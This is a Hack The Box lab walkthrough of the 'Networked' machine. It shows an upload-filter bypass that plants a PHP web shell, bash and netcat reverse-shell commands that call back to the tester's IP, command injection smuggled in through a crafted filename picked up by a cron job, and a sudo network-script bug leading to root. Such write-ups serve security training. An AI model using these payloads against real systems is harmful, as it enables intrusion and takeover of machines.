# Hack The Box - Networked Walkthrough w/o Metasploit

## Reconnaissance
Retrieving the IP address of the machine, I started a quick inital Nmap scan to see which ports are open and which services are running on those ports.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Networked]
└─$ sudo nmap -sC -sV -O -oA nmap/initial 10.10.10.146
[sudo] password for darshan: 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-08 05:56 EST
Nmap scan report for 10.10.10.146
Host is up (0.13s latency).
Not shown: 983 filtered tcp ports (no-response), 14 filtered tcp ports (host-prohibited)
PORT    STATE  SERVICE VERSION
22/tcp  open   ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 2275d7a74f81a7af5266e52744b1015b (RSA)
|   256 2d6328fca299c7d435b9459a4b38f9c8 (ECDSA)
|_  256 73cda05b84107da71c7c611df554cfc4 (ED25519)
80/tcp  open   http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
443/tcp closed https
Aggressive OS guesses: Linux 5.0 (94%), Linux 3.10 - 4.11 (94%), Linux 5.1 (94%), HP P2000 G3 NAS device (91%), Linux 3.18 (91%), Linux 3.2 - 4.9 (91%), Linux 3.13 (90%), Linux 3.13 or 4.2 (90%), Linux 4.10 (90%), Linux 4.2 (90%)
No exact OS matches for host (test conditions non-ideal).

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.93 seconds
```

Nmap reported `2` ports to be open:
- port `22`: running `OpenSSH 7.4`
- port `80`: running `Apache httpd 2.4.6`

## Enumeration
Visiting the application in the browser.

![image](https://user-images.githubusercontent.com/87711310/223698155-96d152ea-a5d8-4fec-a592-e2b5fc05877d.png)

It was just a static page with a message and probably revealing the names of the users. Meanwhile, the source-code of the webpage revealed some important information.

![image](https://user-images.githubusercontent.com/87711310/223698508-b255edbe-c947-488c-a9e3-556ef16a48cd.png)

I decided to run `gobuster` to enumerate directories.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Networked]
└─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -u 10.10.10.146 -t 20 -x php,txt
===============================================================
Gobuster v3.4
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.146
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.4
[+] Extensions:              php,txt
[+] Timeout:                 10s
===============================================================
2023/03/08 06:18:43 Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 229]
/uploads              (Status: 301) [Size: 236] [--> http://10.10.10.146/uploads/]
/photos.php           (Status: 200) [Size: 1302]
/upload.php           (Status: 200) [Size: 169]
/lib.php              (Status: 200) [Size: 0]
/backup               (Status: 301) [Size: 235] [--> http://10.10.10.146/backup/]
===============================================================
2023/03/08 06:18:33 Finished
===============================================================
```

Visiting the `/upload.php` gave an option to upload files. The web server can run php code, so I'll have to check if it accepts `.php` files. Maybe I could upload a php shell on the server.

![image](https://user-images.githubusercontent.com/87711310/223700950-4d9bc356-dee4-4aa3-bbf8-6707f78b84c8.png)

Next, the `/photos.php` contained a bunch of images. The images that get uploaded on the upload page, are presented on this page.

![image](https://user-images.githubusercontent.com/87711310/223701422-c2ec209c-59ad-47b3-a121-9083ae1a7e71.png)

The link to each of the image was given in the source of the page too.

![image](https://user-images.githubusercontent.com/87711310/223701681-e18dbd91-5815-40ee-971a-ae627c7d4b13.png)

So not only did I have a way of uploading files on the web server, but I could also execute those files. In most cases, restrictions are put in place preventing us from uploading any file. Therefore, I’ll need to first enumerate these restrictions and then figure out a way to bypass them.

Next, I visited the `/backup` directory. It contained a compressed file.

![image](https://user-images.githubusercontent.com/87711310/223704073-386dc340-a83b-46eb-b3ac-853c7ba3d770.png)

So, I downloaded the compressed file and unzipped it on my machine.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Networked]
└─$ tar -xvf backup.tar  
index.php
lib.php
photos.php
upload.php           
```

It contained the source code of the php scripts running on the web server. This is great for me, because I could simply look at the php scripts in order to determine the validation that is put in place for uploading files.

## Initial Foothold.

I started with viewing the `upload.php` script.  It takes in the uploaded file and performs two validation checks on it.

```php
<?php
require '/var/www/html/lib.php';

define("UPLOAD_DIR", "/var/www/html/uploads/");

if( isset($_POST['submit']) ) {
  if (!empty($_FILES["myFile"])) {
    $myFile = $_FILES["myFile"];

//First Validation Check
    if (!(check_file_type($_FILES["myFile"]) && filesize($_FILES['myFile']['tmp_name']) < 60000)) {
      echo '<pre>Invalid image file.</pre>';
      displayform();
    }

    if ($myFile["error"] !== UPLOAD_ERR_OK) {
        echo "<p>An error occurred.</p>";
        displayform();
        exit;
    }
//Second Validation Check
    //$name = $_SERVER['REMOTE_ADDR'].'-'. $myFile["name"];
    list ($foo,$ext) = getnameUpload($myFile["name"]);
    $validext = array('.jpg', '.png', '.gif', '.jpeg');
    $valid = false;
    foreach ($validext as $vext) {
      if (substr_compare($myFile["name"], $vext, -strlen($vext)) === 0) {
        $valid = true;
      }
    }

    if (!($valid)) {
      echo "<p>Invalid image file</p>";
      displayform();
      exit;
    }
    $name = str_replace('.','_',$_SERVER['REMOTE_ADDR']).'.'.$ext;

    $success = move_uploaded_file($myFile["tmp_name"], UPLOAD_DIR . $name);
    if (!$success) {
        echo "<p>Unable to save file.</p>";
        exit;
    }
    echo "<p>file uploaded, refresh gallery</p>";

    // set proper permissions on the new file
    chmod(UPLOAD_DIR . $name, 0644);
  }
} else {
  displayform();
}
?>
```

Considering the second validation check, it takes an array of allowed file extensions and checks if the uploaded file contains that extension. The check is being performed using the `substr_compare()` funtion. This fucntion compares two strings.

```
substr_compare ( string $main_str , string $str , int $offset)
```

It requires at least three parameter.
- `$main_str`: the main string being compared.
- `$str`: the secondary string being compared.
- `$offset`: the start position for the comparison. If negative, it starts counting from the end of the string.

The following is an example.

```
substr_compare ( test.png , .png, -4)
```

Since the offset in the above example is negative, it starts at the end of the string `test.png` and checks every character with the characters in the string `.png` (4 characters). In this case the test would pass and the function outputs a zero. This is exactly what the upload script is doing. Therefore, in order to bypass that, all I had to do is upload a file with a valid extension at the end. For example: `test.php.png`.

Now, in the First Validation check, the script calls the `check_file_type()` function from teh `lib.php` file. This in turn calls the `file_mime_type()` function to determine the mime type of the file. Then the mime type is checked to see if it contains the string `image/` in it.

```
function check_file_type($file) {
  $mime_type = file_mime_type($file);
  if (strpos($mime_type, 'image/') === 0) {
      return true;
  } else {
      return false;
  }  
}
```

This can be easily bypassed because I can simply include what is known as [magic bytes](https://en.wikipedia.org/wiki/List_of_file_signatures) in the file in order to trick the script into thinking the file is an image. This can be be done by adding the string `GIF87a` to the file.

So I created a file, named it `test.php.png` and added the following code to it.

```
GIF87a
<?php system($_GET['cmd']); ?>
```

Here, the first line tricks the application into thinking it is an image and the second line adds a parameter to the get request called `cmd`.

Now, I started BurpSuite, intercepted the request and made the following changes.

![image](https://user-images.githubusercontent.com/87711310/223727407-ff8c4c00-eb5c-4b54-b9db-7895ea699e20.png)

From the Burp request, it was clearly visible that I was able to bypass the validation check easily and that the request identified it as an image.

Now, I visited the `/photos.php`, so look at the uploaded payload.

![image](https://user-images.githubusercontent.com/87711310/223728122-00815dca-90ea-4eaf-b4c3-d92b6a0a64f3.png)

Now that it was clear that the image was uploaded. On `Right clicking` and selecting `View Image`, the script will be excuted and appending cmd parameter and running a linux command will result in code execution.

The path to code execution is: 
```
uploads/10_10_14_47.php.png?cmd=whoami
```

![image](https://user-images.githubusercontent.com/87711310/223729321-b9cceb8a-de84-4632-b921-c37bdb3bde4c.png)

Now that I was able to execute code on the system, I decided to get a reverse shell.

I started a netcat listener on my machine.

```
nc -lvnp 9999
```

Then I disabled the `File Extension` in `Proxy > Options > Intercept Client Request` in order to intercept the request and ran the `whoami` command,  intercepted it and sent it to the Burp Repeater

Next, I replaced the `whoami` command in the `cmd` parameter with the following reverse shell command:

```
bash -c 'bash -i >& /dev/tcp/10.10.14.47/9999 0>&1'
```
NOTE: Make sure to URL encode the above reverse shell command before sending it.

![image](https://user-images.githubusercontent.com/87711310/223730894-56c20116-9cf0-40e9-8396-52c439573391.png)

I got back a shell instantly.

Upgrading to a better shell.

```
python -c 'import pty; pty.spawn("/bin/bash")'
```

Attempt to grab the user flag.

Unfortunately, I was running as the web daemon user apache and I didn’t have privileges to view the user.txt flag. Therefore, we need to escalate our privileges.

```
bash-4.2$ cd home
cd home
bash-4.2$ ls
ls
guly
bash-4.2$ cd guly
cd guly
bash-4.2$ ls
ls
check_attack.php  crontab.guly  user.txt
bash-4.2$ cat user.txt
cat user.txt
cat: user.txt: Permission denied
```

## Privilege Escalation
Since the user flag was in the home directory of the user `guly`, i had to escalate my privileges to either guly or root.

Inside the `/guly` directory, I found a file named `crontaab.guly` which was wierd in first place. So, I decided to look at it.

```
bash-4.2$ ls
ls
check_attack.php  crontab.guly  user.txt
bash-4.2$ cat crontab.guly
cat crontab.guly
*/3 * * * * php /home/guly/check_attack.php
```

It was running the file `check_attack.php` script, which was in the same directory, every 3 minutes. So, I looked inside the file.

```php
bash-4.2$ cat check_attack.php
cat check_attack.php
<?php
require '/var/www/html/lib.php';
$path = '/var/www/html/uploads/';
$logpath = '/tmp/attack.log';
$to = 'guly';
$msg= '';
$headers = "X-Mailer: check_attack.php\r\n";

$files = array();
$files = preg_grep('/^([^.])/', scandir($path));

foreach ($files as $key => $value) {
        $msg='';
  if ($value == 'index.html') {
        continue;
  }
  #echo "-------------\n";

  #print "check: $value\n";
  list ($name,$ext) = getnameCheck($value);
  $check = check_ip($name,$value);

  if (!($check[0])) {
    echo "attack!\n";
    # todo: attach file
    file_put_contents($logpath, $msg, FILE_APPEND | LOCK_EX);

    exec("rm -f $logpath");
    exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");
    echo "rm -f $path$value\n";
    mail($to, $msg, $msg, $headers, "-F$value");
  }
}

?>
```

The script is taking in all the files in the `/var/www/html/uploads` directory and running the `getnameCheck()` and `check_ip()` functions on it from the `lib.php` file.

```
function getnameCheck($filename) {
  $pieces = explode('.',$filename);
  $name= array_shift($pieces);
  $name = str_replace('_','.',$name);
  $ext = implode('.',$pieces);
  #echo "name $name - ext $ext\n";
  return array($name,$ext);
}function check_ip($prefix,$filename) {
  //echo "prefix: $prefix - fname: $filename<br>\n";
  $ret = true;
  if (!(filter_var($prefix, FILTER_VALIDATE_IP))) {
    $ret = false;
    $msg = "4tt4ck on file ".$filename.": prefix is not a valid ip ";
  } else {
    $msg = $filename;
  }
  return array($ret,$msg);
}
```

The `getnameCheck()` function simply separates the name of the file from the extension of the file. The `check_ip()` function checks if the filename is a valid IP address. If it is not, it will return false which will trigger the attack component in the `check_attack.php` file.

```
if (!($check[0])) {
    echo "attack!\n";
    # todo: attach file
    file_put_contents($logpath, $msg, FILE_APPEND | LOCK_EX);exec("rm -f $logpath");
    exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");
    echo "rm -f $path$value\n";
    mail($to, $msg, $msg, $headers, "-F$value");
  }
```

This passes the path of the file to the `exec()` function and deletes it. Of course, no validation is being done on the input of the `exec()` function and so I could abuse it to escalate privileges.

To do that, I moved to the /var/www/html/uploads directory and created the following file.

```
touch '; nc -c bash 10.10.14.12 3333'
```

I started a listener to recieve the shell
```
nc -lvnp 3333
```

Ran the script.
```
bash-4.2$ cd /var/www/html
cd /var/www/html
bash-4.2$ cd uploads
cd uploads
bash-4.2$ touch '; nc -c bash 10.10.14.47 3333'
touch '; nc -c bash 10.10.14.47 3333'
```

And waited for the cron job to run and I got back a shell!

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Networked]
└─$ nc -lvnp 3333
listening on [any] 3333 ...
connect to [10.10.14.47] from (UNKNOWN) [10.10.10.146] 41902
whoami
guly
```

Upgrading to a better shell

```
python -c 'import pty;pty.spawn("/bin/bash")'
[guly@networked ~]$ ls
ls
check_attack.php  crontab.guly  user.txt
```

Grabbing the user flag.
```
[guly@networked ~]$ cat user.txt
cat user.txt
[REDACTED]
```

Now, before downloading and running `Linpeas`, I decided to check whether I was able to run `sudo -l` to see which permission the user `guly` had and luckily I was able to get the following results.

```
[guly@networked ~]$ sudo -l
sudo -l
Matching Defaults entries for guly on networked:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin,
    env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS",
    env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE",
    env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES",
    env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE",
    env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User guly may run the following commands on networked:
    (root) NOPASSWD: /usr/local/sbin/changename.sh
```

Viewing the permissions on the file.

```
ls -la /usr/local/sbin | grep changename.sh
-rwxr-xr-x   1 root root  422 Jul  8  2019 changename.sh
```

I only had read and execute permissions on the file. So, I decided to take a look at the file.

```
[guly@networked ~]$ cat /usr/local/sbin/changename.sh
cat /usr/local/sbin/changename.sh
#!/bin/bash -p
cat > /etc/sysconfig/network-scripts/ifcfg-guly << EoF
DEVICE=guly0
ONBOOT=no
NM_CONTROLLED=no
EoF

regexp="^[a-zA-Z0-9_\ /-]+$"

for var in NAME PROXY_METHOD BROWSER_ONLY BOOTPROTO; do
        echo "interface $var:"
        read x
        while [[ ! $x =~ $regexp ]]; do
                echo "wrong input, try again"
                echo "interface $var:"
                read x
        done
        echo $var=$x >> /etc/sysconfig/network-scripts/ifcfg-guly
done
  
/sbin/ifup guly0
```

It takes in the content of the file `ifcfg-guly` and does a simple regex check on the input. So, I looked at the permissions of the `ifcfg-guly` file.

```
[guly@networked ~]$ ls -la /etc/sysconfig/network-scripts/ | grep ifcfg-guly
ls -la /etc/sysconfig/network-scripts/ | grep ifcfg-guly
-rw-r--r--  1 root root   114 Jul  8  2019 ifcfg-guly
```

So, now, I was only able to read the file.

```
[guly@networked network-scripts]$ cat /etc/sysconfig/network-scripts/ifcfg-guly
<ipts]$ cat /etc/sysconfig/network-scripts/ifcfg-guly                        
DEVICE=guly0
ONBOOT=no
NM_CONTROLLED=no
NAME=ps /tmp/foo
PROXY_METHOD=asodih
BROWSER_ONLY=asdoih
BOOTPROTO=asdoih
```

The `NAME` is assigned a system command, so we can probably use this to escalate privileges. After a bit of googling, I found this [bug report](https://bugzilla.redhat.com/show_bug.cgi?id=1697473) that states that incorrect whitespace filtering on the NAME attribute leads to code execution. Since I could run the `changename.sh` script with sudo privileges, it will prompt me to enter the NAME value and since it’s not properly validated, I could get a shell with root privileges!

```
[guly@networked network-scripts]$ sudo /usr/local/sbin/changename.sh
sudo /usr/local/sbin/changename.sh
interface NAME:
random bash
random bash
interface PROXY_METHOD:
random
random
interface BROWSER_ONLY:
random
random
interface BOOTPROTO:
random
random
[root@networked network-scripts]# whoami
whoami
root
```

And I was ROOT!!

Grabbing the root flag.

```
[root@networked network-scripts]# cat /root/root.txt
cat /root/root.txt
[REDACTED]
```


## Beyond Root - PHP Misconfiguration

In gaining an initial foothold, I uploaded a file `10_10_14_5.php.png`, and the webserver treated it as PHP code and ran it. I wanted to look at the Apache configuration to see how it compared to the issue mentioned in this [article](https://blog.remirepo.net/post/2013/01/13/PHP-and-Apache-SetHandler-vs-AddHandler).

The Apache config files are stored in `/etc/httpd/`. The main config is `/etc/httpd/conf/httpd.conf`, but it’s last lines are:

```
# Supplemental configuration
#
# Load config files in the "/etc/httpd/conf.d" directory, if any.
IncludeOptional conf.d/*.conf
```

Inside `/etc/http/conf.d`, I found a handful of `.conf` files:

```
[root@networked ~]# ls /etc/httpd/conf.d/
autoindex.conf  php.conf  README  userdir.conf  welcome.conf
```

Checking out the `php.cong`, I saw the same config from the blog post:
```
[root@networked ~]# cat /etc/httpd/conf.d/php.conf 
AddHandler php5-script .php
AddType text/html .php
DirectoryIndex index.php
php_value session.save_handler "files"
php_value session.save_path    "/var/lib/php/session"
```

I could see `AddHander` for `.php`, which will has implied wildcards on each side, so it will match on `.php` anywhere in filename.
